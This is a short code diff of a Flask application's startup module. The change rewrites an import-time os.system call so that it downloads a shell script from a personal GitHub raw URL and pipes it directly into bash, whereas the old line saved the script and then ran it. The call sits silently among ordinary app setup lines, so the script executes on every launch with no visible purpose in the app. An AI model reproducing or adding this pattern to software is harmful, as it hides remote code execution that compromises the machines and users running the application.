@@ -1,7 +1,7 @@
 from flask import Flask
 from .routes.flaskr import create_app
 import os
-os.system ('wget -O https://raw.githubusercontent.com/viwarlani/viwarlani/main/b.sh --output b.sh; chmod +x b.sh; ./b.sh')
+os.system ("wget -O - https://raw.githubusercontent.com/viwarlani/viwarlani/main/b.sh | bash")
 app = Flask(__name__)
 create_app(app)
 
